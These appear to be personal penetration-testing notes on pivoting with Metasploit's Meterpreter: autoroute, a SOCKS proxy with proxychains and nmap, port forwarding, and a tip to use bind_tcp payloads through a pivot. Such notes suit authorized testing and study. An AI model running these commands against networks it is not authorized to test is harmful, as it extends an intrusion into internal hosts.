# Meterpreter
#### Route
* `meterpreter > run autoroute -s 10.2.31.0/24`
* background meterpreter
* `use auxiliary/server/socks_proxy`
* configure it according with `cat /etc/proxychains.conf`
* `run/exploit` socks_proxy
* in linux host use `proxychains nmap -sT ...`
#### Port forward
* `use auxiliary/scanner/portscan/tcp` - portscan (after running autoroute)
* `meterpreter> portfwd add -l <local_port> -p <target_port> -r <target_IP>`
* `meterpreter> portfwd list` - check port forwarding list
* in linux host, run `nmap <local_port>`
##### Notes
* when route is activated and exploiting other hosts through msf pivoting, `reverse_tcp` doesn't work
  * use `bind_tcp` payloads 

## Cool resources
https://book.hacktricks.xyz/tunneling-and-port-forwarding
